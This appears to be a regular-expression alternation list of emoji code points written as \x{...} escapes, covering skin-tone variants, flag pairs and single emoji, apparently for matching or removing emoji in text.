|\x{1f441}\x{fe0f}|\x{1f1f5}\x{1f1fe}|\x{1f9bb}\x{1f3ff}|\x{1f1f7}\x{1f1fa}|\x{1f466}\x{1f3fd}|\x{1f64c}\x{1f3fe}|\x{1f466}\x{1f3fe}|\x{1f64c}\x{1f3fd}|\x{1f466}\x{1f3ff}|\x{1f3cb}\x{fe0f}|\x{1f467}\x{1f3fb}|\x{1f466}\x{1f3fb}|\x{1f64c}\x{1f3fc}|\x{1f6a3}\x{1f3ff}|\x{1f64c}\x{1f3fb}|\x{1f6a3}\x{1f3fe}|\x{1f6a3}\x{1f3fd}|\x{1f6a3}\x{1f3fc}|\x{1f466}\x{1f3fc}|\x{1f1f7}\x{1f1f8}|\x{1f6b4}\x{1f3fe}|\x{1f476}\x{1f3fe}|\x{1f1f6}\x{1f1e6}|\x{1f1f7}\x{1f1ea}|\x{1f476}\x{1f3fb}|\x{1f476}\x{1f3fc}|\x{1f476}\x{1f3fd}|\x{1f6b4}\x{1f3ff}|\x{1f476}\x{1f3ff}|\x{1f9d2}\x{1f3ff}|\x{1f1f7}\x{1f1f4}|\x{1f64c}\x{1f3ff}|\x{1f9d2}\x{1f3fb}|\x{1f9d2}\x{1f3fc}|\x{1f9d2}\x{1f3fd}|\x{1f9d2}\x{1f3fe}|\x{1f1f5}\x{1f1f1}|\x{1f9bb}\x{1f3fe}|\x{1f6a3}\x{1f3fb}|\x{270d}\x{1f3fd}|\x{1f485}\x{1f3fb}|\x{1f4aa}\x{1f3fd}|\x{1f1f3}\x{1f1f5}|\x{270d}\x{1f3ff}|\x{270d}\x{1f3fe}|\x{1f4aa}\x{1f3fe}|\x{1f4aa}\x{1f3ff}|\x{1f3cb}\x{1f3ff}|\x{1f1f4}\x{1f1f2}|\x{1f1f5}\x{1f1e6}|\x{270d}\x{1f3fc}|\x{1f1f5}\x{1f1ea}|\x{1f9b5}\x{1f3fb}|\x{1f9b5}\x{1f3fc}|\x{1f4aa}\x{1f3fc}|\x{1f4aa}\x{1f3fb}|\x{270d}\x{1f3fb}|\x{1f933}\x{1f3fc}|\x{1f485}\x{1f3fd}|\x{1f485}\x{1f3fe}|\x{1f485}\x{1f3ff}|\x{1f1f3}\x{1f1fa}|\x{1f1f3}\x{1f1f7}|\x{1f933}\x{1f3fb}|\x{1f933}\x{1f3fd}|\x{1f3cb}\x{1f3fe}|\x{1f3cb}\x{1f3fb}|\x{1f933}\x{1f3fe}|\x{1f933}\x{1f3ff}|\x{1f1f3}\x{1f1ff}|\x{1f3cb}\x{1f3fc}|\x{1f3cb}\x{1f3fd}|\x{1f9b5}\x{1f3fd}|\x{1f9b5}\x{1f3fe}|\x{1f9bb}\x{1f3fd}|\x{1f64f}\x{1f3fb}|\x{1f1f5}\x{1f1ed}|\x{1f442}\x{1f3fb}|\x{1f442}\x{1f3fc}|\x{1f64f}\x{1f3fc}|\x{1f442}\x{1f3fd}|\x{1f442}\x{1f3fe}|\x{1f442}\x{1f3ff}|\x{1f9b6}\x{1f3fe}|\x{1f1f5}\x{1f1f0}|\x{1f1f3}\x{1f1f1}|\x{1f1f3}\x{1f1ee}|\x{1f9bb}\x{1f3fb}|\x{1f9bb}\x{1f3fc}|\x{1f932}\x{1f3ff}|\x{1f9b6}\x{1f3ff}|\x{1f64f}\x{1f3fd}|\x{1f1f3}\x{1f1f4}|\x{26f9}\x{1f3ff}|\x{1f9b5}\x{1f3ff}|\x{1f1f5}\x{1f1eb}|\x{270d}\x{fe0f}|\x{1f9b6}\x{1f3fb}|\x{1f9b6}\x{1f3fc}|\x{1f9b6}\x{1f3fd}|\x{26f9}\x{1f3fe}|\x{26f9}\x{fe0f}|\x{26f9}\x{1f3fd}|\x{26f9}\x{1f3fc}|\x{1f64f}\x{1f3ff}|\x{26f9}\x{1f3fb}|\x{1f64f}\x{1f3fe}|\x{1f1f5}\x{1f1ec}|\x{1f1f3}\x{1f1e8}|\x{1f485}\x{1f3fc}|\x{1f44a}\x{1f3fc}|\x{1f44a}\x{1f3fd}|\x{1f3c7}\x{1f3ff}|\x{1f3c4}\x{1f3fe}|\x{1f3c7}\x{1f3fe}|\x{1f3c4}\x{1f3ff}|\x{1f9d4}\x{1f3fb}|\x{270a}\x{1f3ff}|\x{1f1f2}\x{1f1fc}|\x{1f44a}\x{1f3fb}|\x{1f3c7}\x{1f3fd}|\x{1f1f8}\x{1f1e9}|\x{1f44f}\x{1f3ff}|\x{1f3c7}\x{1f3fc}|\x{1f3c7}\x{1f3fb}|\x{1f3c4}\x{1f3fc}|\x{1f44a}\x{1f3fe}|\x{1f1f8}\x{1f1f2}|\x{1f1f8}\x{1f1f3}|\x{1f9d3}\x{1f3fd}|\x{1f44a}\x{1f3ff}|\x{1f468}\x{1f3ff}|\x{1f6b5}\x{1f3ff}|\x{1f9d3}\x{1f3fe}|\x{1f468}\x{1f3fe}|\x{1f6b5}\x{1f3fe}|\x{1f468}\x{1f3fd}|\x{1f468}\x{1f3fc}|\x{1f468}\x{1f3fb}|\x{1f3c4}\x{1f3fd}|\x{1f3c4}\x{1f3fb}|\x{1f1f8}\x{1f1f1}|\x{1f9d3}\x{1f3fc}|\x{1f3c2}\x{1f3fb}|\x{1f3c2}\x{1f3fc}|\x{1f3c2}\x{1f3fd}|\x{1f3c2}\x{1f3fe}|\x{1f3c2}\x{1f3ff}|\x{1f3cc}\x{fe0f}|\x{1f1f8}\x{1f1ef}|\x{1f3cc}\x{1f3fb}|\x{1f3cc}\x{1f3fc}|\x{1f3cc}\x{1f3fd}|\x{1f3cc}\x{1f3fe}|\x{1f3cc}\x{1f3ff}|\x{26f7}\x{fe0f}|\x{1f1f8}\x{1f1ea}|\x{1f9d3}\x{1f3fb}|\x{1f1f8}\x{1f1ee}|\x{1f469}\x{1f3ff}|\x{1f469}\x{1f3fe}|\x{1f469}\x{1f3fd}|\x{1f469}\x{1f3fc}|\x{1f1f8}\x{1f1ed}|\x{1f469}\x{1f3fb}|\x{1f1f8}\x{1f1ec}|\x{1f9d4}\x{1f3ff}|\x{1f9d4}\x{1f3fe}|\x{1f9d4}\x{1f3fd}|\x{1f9d4}\x{1f3fc}|\x{1f6b5}\x{1f3fd}|\x{1f9d3}\x{1f3ff}|\x{1f6b5}\x{1f3fc}|\x{1f475}\x{1f3fd}|\x{1f91c}\x{1f3fd}|\x{1f91c}\x{1f3fe}|\x{1f91c}\x{1f3ff}|\x{1f474}\x{1f3fe}|\x{1f474}\x{1f3ff}|\x{1f1f3}\x{1f1e6}|\x{1f1f8}\x{1f1f7}|\x{1f9d1}\x{1f3fb}|\x{1f475}\x{1f3fb}|\x{1f1f8}\x{1f1e6}|\x{1f44f}\x{1f3fb}|\x{1f475}\x{1f3fc}|\x{1f475}\x{1f3fe}|\x{1f1f8}\x{1f1f4}|\x{1f467}\x{1f3ff}|\x{1f44f}\x{1f3fc}|\x{1f467}\x{1f3fe}|\x{1f475}\x{1f3ff}|\x{1f1f8}\x{1f1f8}|\x{1f64d}\x{1f3fb}|\x{1f64d}\x{1f3fc}|\x{1f467}\x{1f3fd}|\x{1f44f}\x{1f3fd}|\x{1f467}\x{1f3fc}|\x{1f44f}\x{1f3fe}|\x{1f1f7}\x{1f1fc}|\x{1f64d}\x{1f3fd}|\x{1f91c}\x{1f3fc}|\x{1f9d1}\x{1f3fc}|\x{1f9d1}\x{1f3fd}|\x{1f91b}\x{1f3fc}|\x{1f1f8}\x{1f1e8}|\x{1f6b5}\x{1f3fb}|\x{1f471}\x{1f3ff}|\x{1f1f2}\x{1f1fd}|\x{1f474}\x{1f3fb}|\x{1f1f2}\x{1f1fe}|\x{1f471}\x{1f3fe}|\x{1f471}\x{1f3fd}|\x{1f91b}\x{1f3fb}|\x{1f471}\x{1f3fc}|\x{1f91c}\x{1f3fb}|\x{1f471}\x{1f3fb}|\x{1f1f8}\x{1f1f0}|\x{1f474}\x{1f3fd}|\x{1f9d1}\x{1f3fe}|\x{1f91b}\x{1f3fd}|\x{1f9d1}\x{1f3ff}|\x{1f91b}\x{1f3fe}|\x{1f474}\x{1f3fc}|\x{1f1f8}\x{1f1e7}|\x{1f1f2}\x{1f1ff}|\x{1f91b}\x{1f3ff}|\x{1f4c5}|\x{1f58b}|\x{1f5c2}|\x{1f58a}|\x{1f4dd}|\x{1f4c1}|\x{1f4c2}|\x{1f4bc}|\x{1f58d}|\x{1f58c}|\x{2702}|\x{1f4c6}|\x{1f4ce}|\x{1f5dd}|\x{1f4cb}|\x{1f511}|\x{1f510}|\x{1f4cc}|\x{1f4cd}|\x{1f50f}|\x{1fa93}|\x{1f587}|\x{1f4cf}|\x{1f513}|\x{1f512}|\x{1f5d1}|\x{1f5c4}|\x{1f5c3}|\x{1f528}|\x{26cf}|\x{1f5d2}|\x{1f527}|\x{1f5d3}|\x{2696}|\x{1f4c7}|\x{1f5dc}|\x{2699}|\x{1f4c8}|\x{1f529}|\x{1f6e1}|\x{1f4ca}|\x{1f3f9}|\x{1f52b}|\x{2694}|\x{1f4c9}|\x{1f5e1}|\x{1f6e0}|\x{2692}|\x{1f4d0}|\x{1f4d7}|\x{2712}|\x{1f3bb}|\x{1f3b5}|\x{1f3b6}|\x{1f601}|\x{1f399}|\x{1f39a}|\x{1f39b}|\x{1f3a4}|\x{1f3a7}|\x{1f4fb}|\x{1f3b7}|\x{1f3b8}|\x{1f3b9}|\x{1f3ba}|\x{1fa95}|\x{1f515}|\x{1f941}|\x{1f4f1}|\x{1f4f2}|\x{260e}|\x{1f4de}|\x{1f4df}|\x{1f4e0}|\x{1f50b}|\x{1f50c}|\x{1f4bb}|\x{1f5a5}|\x{1f5a8}|\x{2328}|\x{1f3bc}|\x{1f514}|\x{1f5b1}|\x{1f3a9}|\x{1f45d}|\x{1f6cd}|\x{1f392}|\x{1f45e}|\x{1f45f}|\x{1f97e}|\x{1f97f}|\x{1f460}|\x{1f461}|\x{1fa70}|\x{1f462}|\x{1f451}|\x{1f452}|\x{1f393}|\x{1f4ef}|\x{1f9e2}|\x{26d1}|\x{1f9af}|\x{1f484}|\x{1f48d}|\x{1f48e}|\x{1f507}|\x{1f604}|\x{1f508}|\x{1f509}|\x{1f50a}|\x{1f4e2}|\x{1f4e3}|\x{1f45c}|\x{1f5b2}|\x{270f}|\x{1f4b1}|\x{1f5de}|\x{1f4d1}|\x{1f516}|\x{1f3f7}|\x{1f4b0}|\x{1f4b4}|\x{1f4b5}|\x{1f4b6}|\x{1f4b7}|\x{1f4b8}|\x{1f4b3}|\x{1f9fe}|\x{1f4b9}|\x{1f4b2}|\x{1f4c4}|\x{2709}|\x{1f4e7}|\x{1f4e8}|\x{1f4e9}|\x{1f4e4}|\x{1f4e5}|\x{1f4e6}|\x{1f4eb}|\x{1f4ea}|\x{1f4ec}|\x{1f4ed}|\x{1f4ee}|\x{1f5f3}|\x{1f4f0}|\x{1f4dc}|\x{1f4bd}|\x{1f50d}|\x{1f4be}|\x{1f4bf}|\x{1f4c0}|\x{1f9ee}|\x{1f3a5}|\x{1f39e}|\x{1f4fd}|\x{1f3ac}|\x{1f4fa}|\x{1f4f7}|\x{1f4f8}|\x{1f4f9}|\x{1f4fc}|\x{1f50e}|\x{1f4c3}|\x{1f56f}|\x{1f4a1}|\x{1f526}|\x{1f3ee}|\x{1fa94}|\x{1f4d4}|\x{1f4d5}|\x{1f4d6}|\x{1f4d8}|\x{1f4d9}|\x{1f4da}|\x{1f4d3}|\x{1f4d2}|\x{1f4ff}|\x{2795}|\x{1f517}|\x{1f521}|\x{263a}|\x{1f617}|\x{1f618}|\x{1f929}|\x{1f60d}|\x{1f970}|\x{1f607}|\x{1f60a}|\x{1f609}|\x{1f643}|\x{1f642}|\x{1f51f}|\x{1f520}|\x{1f522}|\x{00ae}|\x{1f523}|\x{1f524}|\x{1f170}|\x{1f18e}|\x{1f171}|\x{1f191}|\x{1f192}|\x{1f193}|\x{2139}|\x{1f194}|\x{24c2}|\x{1f195}|\x{1f196}|\x{1f17e}|\x{2122}|\x{00a9}|\x{1f17f}|\x{274c}|\x{2642}|\x{2695}|\x{267e}|\x{267b}|\x{269c}|\x{1f531}|\x{1f4db}|\x{1f530}|\x{2b55}|\x{2705}|\x{2611}|\x{2714}|\x{2716}|\x{274e}|\x{3030}|\x{2796}|\x{2797}|\x{27b0}|\x{27bf}|\x{303d}|\x{2733}|\x{2734}|\x{2747}|\x{203c}|\x{2049}|\x{2753}|\x{2754}|\x{2755}|\x{2757}|\x{1f197}|\x{1f198}|\x{1f4f4}|\x{1f53a}|\x{1f7eb}|\x{2b1b}|\x{2b1c}|\x{25fc}|\x{25fb}|\x{25fe}|\x{25fd}|\x{25aa}|\x{25ab}|\x{1f536}|\x{1f537}|\x{1f538}|\x{1f539}|\x{1f53b}|\x{1f7e6}|\x{1f4a0}|\x{1f518}|\x{1f533}|\x{1f532}|\x{1f3c1}|\x{1f6a9}|\x{1f38c}|\x{1f3f4}|\x{1f3f3}|\x{1f602}|\x{1f923}|\x{1f605}|\x{1f606}|\x{1f45a}|\x{1f7ea}|\x{1f7e9}|\x{1f199}|\x{1f233}|\x{1f19a}|\x{1f201}|\x{1f202}|\x{1f237}|\x{1f236}|\x{1f22f}|\x{1f250}|\x{1f239}|\x{1f21a}|\x{1f232}|\x{1f251}|\x{1f238}|\x{1f234}|\x{3297}|\x{1f7e8}|\x{3299}|\x{1f23a}|\x{1f235}|\x{1f534}|\x{1f7e0}|\x{1f7e1}|\x{1f7e2}|\x{1f535}|\x{1f7e3}|\x{1f7e4}|\x{26ab}|\x{26aa}|\x{1f7e5}|\x{1f7e7}|\x{2640}|\x{1f4f3}|\x{26d3}|\x{1f6c4}|\x{26b1}|\x{1f5ff}|\x{1f3e7}|\x{1f6ae}|\x{1f6b0}|\x{267f}|\x{1f6b9}|\x{1f6ba}|\x{1f6bb}|\x{1f6bc}|\x{1f6be}|\x{1f6c2}|\x{1f6c3}|\x{1f6c5}|\x{1f6ac}|\x{26a0}|\x{1f6b8}|\x{26d4}|\x{1f6ab}|\x{1f6b3}|\x{1f6ad}|\x{1f6af}|\x{1f6b1}|\x{1f6b7}|\x{1f4f5}|\x{1f51e}|\x{2622}|\x{2623}|\x{2b06}|\x{26b0}|\x{1f6d2}|\x{27a1}|\x{1fa7a}|\x{1f9f0}|\x{1f9f2}|\x{2697}|\x{1f9ea}|\x{1f9eb}|\x{1f9ec}|\x{1f52c}|\x{1f52d}|\x{1f4e1}|\x{1f489}|\x{1fa78}|\x{1f48a}|\x{1fa79}|\x{1f6aa}|\x{1f9ef}|\x{1f6cf}|\x{1f6cb}|\x{1fa91}|\x{1f6bd}|\x{1f6bf}|\x{1f6c1}|\x{1fa92}|\x{1f9f4}|\x{1f9f7}|\x{1f9f9}|\x{1f9fa}|\x{1f9fb}|\x{1f9fc}|\x{1f9fd}|\x{2197}|\x{2198}|\x{1f4f6}|\x{23ed}|\x{264d}|\x{264e}|\x{264f}|\x{2650}|\x{2651}|\x{2652}|\x{2653}|\x{26ce}|\x{1f500}|\x{1f501}|\x{1f502}|\x{25b6}|\x{23e9}|\x{23ef}|\x{264b}|\x{25c0}|\x{23ea}|\x{23ee}|\x{1f53c}|\x{23eb}|\x{1f53d}|\x{23ec}|\x{23f8}|\x{23f9}|\x{23fa}|\x{23cf}|\x{1f3a6}|\x{1f505}|\x{1f506}|\x{264c}|\x{264a}|\x{2b07}|\x{1f51b}|\x{2199}|\x{2b05}|\x{2196}|\x{2195}|\x{2194}|\x{21a9}|\x{21aa}|\x{2934}|\x{2935}|\x{1f503}|\x{1f504}|\x{1f519}|\x{1f51a}|\x{1f51c}|\x{2649}|\x{1f51d}|\x{1f6d0}|\x{269b}|\x{1f549}|\x{2721}|\x{2638}|\x{262f}|\x{271d}|\x{2626}|\x{262a}|\x{262e}|\x{1f54e}|\x{1f52f}|\x{2648}|\x{1f45b}|\x{1f942}|\x{1f459}|\x{1f9b0}|\x{1f9ae}|\x{1f415}|\x{1f436}|\x{1f9a7}|\x{1f98d}|\x{1f412}|\x{1f435}|\x{1f9b2}|\x{1f9b3}|\x{1f9b1}|\x{1f3ff}|\x{1f429}|\x{1f3fe}|\x{1f3fd}|\x{1f3fc}|\x{1f3fb}|\x{1f463}|\x{1f465}|\x{1f464}|\x{1f5e3}|\x{1f619}|\x{1f60b}|\x{1f61a}|\x{1f43a}|\x{1f61c}|\x{1f98c}|\x{1f411}|\x{1f40f}|\x{1f43d}|\x{1f417}|\x{1f416}|\x{1f437}|\x{1f404}|\x{1f403}|\x{1f402}|\x{1f42e}|\x{1f993}|\x{1f98a}|\x{1f984}|\x{1f40e}|\x{1f434}|\x{1f406}|\x{1f405}|\x{1f42f}|\x{1f981}|\x{1f408}|\x{1f431}|\x{1f99d}|\x{1f61b}|\x{1f92a}|\x{1f42a}|\x{1f60e}|\x{1f491}|\x{1f927}|\x{1f975}|\x{1f976}|\x{1f974}|\x{1f635}|\x{1f92f}|\x{1f48f}|\x{1f920}|\x{1f973}|\x{1f913}|\x{1f922}|\x{1f9d0}|\x{1f615}|\x{1f61f}|\x{1f641}|\x{2639}|\x{1f62e}|\x{1f62f}|\x{1f632}|\x{1f633}|\x{1f97a}|\x{1f92e}|\x{1f915}|\x{1f61d}|\x{1f60f}|\x{1f911}|\x{1f917}|\x{1f92d}|\x{1f92b}|\x{1f914}|\x{1f910}|\x{1f928}|\x{1f610}|\x{1f611}|\x{1f636}|\x{1f612}|\x{1f912}|\x{1f644}|\x{1f62c}|\x{1f925}|\x{1f60c}|\x{1f614}|\x{1f62a}|\x{1f924}|\x{1f46a}|\x{1f634}|\x{1f637}|\x{1f410}|\x{1f42b}|\x{1f627}|\x{1f577}|\x{1f940}|\x{1f339}|\x{1f3f5}|\x{1f4ae}|\x{1f338}|\x{1f490}|\x{1f9a0}|\x{1f99f}|\x{1f982}|\x{1f578}|\x{1f997}|\x{1f33b}|\x{1f41e}|\x{1f41d}|\x{1f41c}|\x{1f41b}|\x{1f98b}|\x{1f40c}|\x{1f41a}|\x{1f419}|\x{1f988}|\x{1f421}|\x{1f33a}|\x{1f33c}|\x{1f41f}|\x{1f343}|\x{1f34f}|\x{1f34e}|\x{1f96d}|\x{1f34d}|\x{1f34c}|\x{1f34b}|\x{1f34a}|\x{1f349}|\x{1f348}|\x{1f347}|\x{1f342}|\x{1f337}|\x{1f341}|\x{1f340}|\x{2618}|\x{1f33f}|\x{1f33e}|\x{1f335}|\x{1f334}|\x{1f333}|\x{1f332}|\x{1f331}|\x{1f420}|\x{1f42c}|\x{1f999}|\x{1f994}|\x{1f43e}|\x{1f9a1}|\x{1f998}|\x{1f9a8}|\x{1f9a6}|\x{1f9a5}|\x{1f43c}|\x{1f428}|\x{1f43b}|\x{1f987}|\x{1f43f}|\x{1f414}|\x{1f407}|\x{1f430}|\x{1f439}|\x{1f400}|\x{1f401}|\x{1f42d}|\x{1f99b}|\x{1f98f}|\x{1f418}|\x{1f992}|\x{1f983}|\x{1f413}|\x{1f40b}|\x{1f99c}|\x{1f433}|\x{1f996}|\x{1f995}|\x{1f409}|\x{1f432}|\x{1f40d}|\x{1f98e}|\x{1f422}|\x{1f40a}|\x{1f438}|\x{1f99a}|\x{1f423}|\x{1f9a9}|\x{1f989}|\x{1f9a2}|\x{1f986}|\x{1f985}|\x{1f54a}|\x{1f427}|\x{1f426}|\x{1f425}|\x{1f424}|\x{1f626}|\x{1f628}|\x{1f351}|\x{1f467}|\x{1f9b7}|\x{1f9b4}|\x{1f440}|\x{1f3ca}|\x{1f441}|\x{1f445}|\x{1f444}|\x{1f476}|\x{1f9d2}|\x{1f466}|\x{1f6a3}|\x{1f443}|\x{1f9d1}|\x{1f471}|\x{1f468}|\x{1f9d4}|\x{1f3c4}|\x{1f469}|\x{1f603}|\x{1f9d3}|\x{1f3cc}|\x{1f3c2}|\x{1f9e0}|\x{1f9bb}|\x{1f3c7}|\x{1f91d}|\x{270a}|\x{1f44a}|\x{1f6b5}|\x{1f91b}|\x{1f91c}|\x{1f44f}|\x{1f64c}|\x{1f6b4}|\x{1f450}|\x{1f932}|\x{1f64f}|\x{1f442}|\x{270d}|\x{1f485}|\x{1f3cb}|\x{1f933}|\x{1f4aa}|\x{1f9be}|\x{1f9bf}|\x{1f9b5}|\x{1f9b6}|\x{26f9}|\x{26f7}|\x{1f93a}|\x{1f44d}|\x{1f385}|\x{1f473}|\x{1f472}|\x{1f6b6}|\x{1f9d5}|\x{1f935}|\x{1f470}|\x{1f930}|\x{1f487}|\x{1f931}|\x{1f47c}|\x{1f936}|\x{1f9cd}|\x{1f486}|\x{1f9b8}|\x{1f9df}|\x{1f9de}|\x{1f9b9}|\x{1f9d9}|\x{1f9da}|\x{1f9dd}|\x{1f9db}|\x{1f9dc}|\x{1f478}|\x{1f934}|\x{1f474}|\x{1f57a}|\x{1f475}|\x{1f64d}|\x{1f64e}|\x{1f9d7}|\x{1f645}|\x{1f646}|\x{1f481}|\x{1f9d6}|\x{1f46f}|\x{1f574}|\x{1f483}|\x{1f477}|\x{1f64b}|\x{1f9cf}|\x{1f647}|\x{1f3c3}|\x{1f926}|\x{1f937}|\x{1f46e}|\x{1f575}|\x{1f9ce}|\x{1f482}|\x{1f44e}|\x{1f938}|\x{1f630}|\x{1f63f}|\x{1f47d}|\x{1f47e}|\x{1f916}|\x{1f63a}|\x{1f638}|\x{1f639}|\x{1f63b}|\x{1f63c}|\x{1f63d}|\x{1f640}|\x{1f63e}|\x{1f47a}|\x{1f648}|\x{1f649}|\x{1f64a}|\x{1f48b}|\x{1f46d}|\x{1f48c}|\x{1f498}|\x{1f49d}|\x{1f496}|\x{1f497}|\x{1f47b}|\x{1f479}|\x{1f49e}|\x{1f62b}|\x{1f625}|\x{1f46c}|\x{1f622}|\x{1f62d}|\x{1f631}|\x{1f616}|\x{1f623}|\x{1f61e}|\x{1f613}|\x{1f629}|\x{1f971}|\x{1f921}|\x{1f624}|\x{1f621}|\x{1f620}|\x{1f92c}|\x{1f608}|\x{1f47f}|\x{1f480}|\x{2620}|\x{1f4a9}|\x{1f46b}|\x{1f493}|\x{1f495}|\x{261d}|\x{1f91e}|\x{1f44b}|\x{1f91a}|\x{1f9d8}|\x{1f590}|\x{270b}|\x{1f596}|\x{1f44c}|\x{1f939}|\x{1f90f}|\x{270c}|\x{1f91f}|\x{1f4ad}|\x{1f93e}|\x{1f918}|\x{1f919}|\x{1f448}|\x{1f449}|\x{1f93d}|\x{1f446}|\x{1f93c}|\x{1f595}|\x{1f447}|\x{1f4a4}|\x{1f5ef}|\x{1f49f}|\x{1f90d}|\x{2763}|\x{1f494}|\x{2764}|\x{1f9e1}|\x{1f49b}|\x{1f49a}|\x{1f499}|\x{1f49c}|\x{1f90e}|\x{1f5a4}|\x{1f4af}|\x{1f5e8}|\x{1f4a2}|\x{1f4a5}|\x{1f4ab}|\x{1f6cc}|\x{1f6c0}|\x{1f4a6}|\x{1f4a8}|\x{1f573}|\x{1f4a3}|\x{1f4ac}|\x{1f350}|\x{1f352}|\x{1fa73}|\x{1f313}|\x{1f321}|\x{1f31c}|\x{1f31b}|\x{1f31a}|\x{1f319}|\x{1f318}|\x{1f317}|\x{1f316}|\x{1f315}|\x{1f314}|\x{1f312}|\x{1f31d}|\x{1f311}|\x{1f600}|\x{1f55a}|\x{1f565}|\x{1f559}|\x{1f564}|\x{1f558}|\x{1f563}|\x{1f557}|\x{1f562}|\x{2600}|\x{1f31e}|\x{1f561}|\x{1f328}|\x{26f1}|\x{2614}|\x{2602}|\x{1f302}|\x{1f308}|\x{1f300}|\x{1f32c}|\x{1f32b}|\x{1f32a}|\x{1f329}|\x{1f327}|\x{1fa90}|\x{1f326}|\x{1f325}|\x{1f324}|\x{26c8}|\x{26c5}|\x{2601}|\x{1f30c}|\x{1f320}|\x{1f31f}|\x{2b50}|\x{1f556}|\x{1f555}|\x{2744}|\x{1f6f3}|\x{1f681}|\x{1f4ba}|\x{1fa82}|\x{1f6ec}|\x{1f6eb}|\x{1f6e9}|\x{2708}|\x{1f6a2}|\x{1f6e5}|\x{26f4}|\x{1f6a4}|\x{1f6a0}|\x{1f6f6}|\x{26f5}|\x{2693}|\x{1f6a7}|\x{1f6d1}|\x{1f6a6}|\x{1f6a5}|\x{1f6a8}|\x{26fd}|\x{1f6e2}|\x{1f69f}|\x{1f6a1}|\x{1f560}|\x{1f55b}|\x{1f554}|\x{1f55f}|\x{1f553}|\x{1f55e}|\x{1f552}|\x{1f55d}|\x{1f551}|\x{1f55c}|\x{1f550}|\x{1f567}|\x{1f570}|\x{1f6f0}|\x{23f2}|\x{23f1}|\x{23f0}|\x{231a}|\x{23f3}|\x{231b}|\x{1f9f3}|\x{1f6ce}|\x{1f6f8}|\x{1f680}|\x{26a1}|\x{2603}|\x{1f6e3}|\x{1f9ff}|\x{2663}|\x{2666}|\x{2665}|\x{2660}|\x{1f9f8}|\x{1f9e9}|\x{1f3b2}|\x{1f3b0}|\x{1f579}|\x{1f3ae}|\x{1f52e}|\x{1f0cf}|\x{1f3b1}|\x{1fa81}|\x{1fa80}|\x{1f3af}|\x{1f94c}|\x{1f6f7}|\x{1f3bf}|\x{1f3bd}|\x{1f93f}|\x{1f3a3}|\x{265f}|\x{1f004}|\x{26f3}|\x{1f455}|\x{1fa72}|\x{1fa71}|\x{1f97b}|\x{1f458}|\x{1f457}|\x{1f9e6}|\x{1f9e5}|\x{1f9e4}|\x{1f9e3}|\x{1f456}|\x{1f454}|\x{1f3b4}|\x{1f9ba}|\x{1f97c}|\x{1f97d}|\x{1f576}|\x{1f453}|\x{1f9f6}|\x{1f9f5}|\x{1f3a8}|\x{1f5bc}|\x{1f3ad}|\x{26f8}|\x{1f945}|\x{26c4}|\x{1f389}|\x{1f381}|\x{1f380}|\x{1f9e7}|\x{1f391}|\x{1f390}|\x{1f38f}|\x{1f38e}|\x{1f38d}|\x{1f38b}|\x{1f38a}|\x{1f388}|\x{1f39f}|\x{2728}|\x{1f9e8}|\x{1f387}|\x{1f386}|\x{1f384}|\x{1f383}|\x{1f30a}|\x{1f4a7}|\x{1f525}|\x{2604}|\x{1f397}|\x{1f3ab}|\x{1f94b}|\x{1f3c9}|\x{1f94a}|\x{1f3f8}|\x{1f3d3}|\x{1f94d}|\x{1f3d2}|\x{1f3d1}|\x{1f3cf}|\x{1f3b3}|\x{1f94f}|\x{1f3be}|\x{1f3c8}|\x{1f396}|\x{1f3d0}|\x{1f3c0}|\x{1f94e}|\x{26be}|\x{26bd}|\x{1f949}|\x{1f948}|\x{1f947}|\x{1f3c5}|\x{1f3c6}|\x{1f6e4}|\x{1f68f}|\x{1f353}|\x{1f960}|\x{1f369}|\x{1f368}|\x{1f367}|\x{1f366}|\x{1f9aa}|\x{1f991}|\x{1f990}|\x{1f99e}|\x{1f980}|\x{1f961}|\x{1f95f}|\x{1f382}|\x{1f361}|\x{1f96e}|\x{1f365}|\x{1f364}|\x{1f363}|\x{1f362}|\x{1f360}|\x{1f35d}|\x{1f35c}|\x{1f35b}|\x{1f36a}|\x{1f370}|\x{1f359}|\x{1f37e}|\x{1f9ca}|\x{1f9c9}|\x{1f9c3}|\x{1f964}|\x{1f943}|\x{1f37b}|\x{1f37a}|\x{1f379}|\x{1f378}|\x{1f377}|\x{1f376}|\x{1f9c1}|\x{1f375}|\x{2615}|\x{1f95b}|\x{1f37c}|\x{1f36f}|\x{1f36e}|\x{1f36d}|\x{1f36c}|\x{1f36b}|\x{1f967}|\x{1f35a}|\x{1f358}|\x{1f37d}|\x{1f966}|\x{1f96f}|\x{1f968}|\x{1f956}|\x{1f950}|\x{1f35e}|\x{1f330}|\x{1f95c}|\x{1f344}|\x{1f9c5}|\x{1f9c4}|\x{1f96c}|\x{1f9c7}|\x{1f952}|\x{1f336}|\x{1f33d}|\x{1f955}|\x{1f954}|\x{1f346}|\x{1f951}|\x{1f965}|\x{1f345}|\x{1f95d}|\x{1f95e}|\x{1f9c0}|\x{1f371}|\x{1f9c6}|\x{1f96b}|\x{1f9c2}|\x{1f9c8}|\x{1f37f}|\x{1f957}|\x{1f963}|\x{1f372}|\x{1f958}|\x{1f373}|\x{1f95a}|\x{1f959}|\x{1f356}|\x{1f32f}|\x{1f32e}|\x{1f96a}|\x{1f32d}|\x{1f355}|\x{1f35f}|\x{1f354}|\x{1f953}|\x{1f969}|\x{1f357}|\x{1f962}|\x{1f374}|\x{1f6f9}|\x{1f3aa}|\x{1f69d}|\x{1f68a}|\x{1f689}|\x{1f688}|\x{1f687}|\x{1f686}|\x{1f685}|\x{1f684}|\x{1f683}|\x{1f682}|\x{1f488}|\x{1f68b}|\x{1f3a2}|\x{1f3a1}|\x{1f3a0}|\x{2668}|\x{1f309}|\x{1f307}|\x{1f306}|\x{1f305}|\x{1f304}|\x{1f3d9}|\x{1f69e}|\x{1f68c}|\x{1f301}|\x{1f69a}|\x{1f6f4}|\x{1f6b2}|\x{1f6fa}|\x{1f9bc}|\x{1f9bd}|\x{1f6f5}|\x{1f3cd}|\x{1f3ce}|\x{1f69c}|\x{1f69b}|\x{1f699}|\x{1f68d}|\x{1f698}|\x{1f697}|\x{1f696}|\x{1f695}|\x{1f694}|\x{1f693}|\x{1f692}|\x{1f691}|\x{1f690}|\x{1f68e}|\x{1f303}|\x{26fa}|\x{1f944}|\x{1f30b}|\x{1f9f1}|\x{1f3d7}|\x{1f3db}|\x{1f3df}|\x{1f3de}|\x{1f3dd}|\x{1f3dc}|\x{1f3d6}|\x{1f3d5}|\x{1f5fb}|\x{26f0}|\x{1f3da}|\x{1f3d4}|\x{1f9ed}|\x{1f5fe}|\x{1f5fa}|\x{1f310}|\x{1f30f}|\x{1f30e}|\x{1f30d}|\x{1f3fa}|\x{1f52a}|\x{1f3d8}|\x{1f3e0}|\x{26f2}|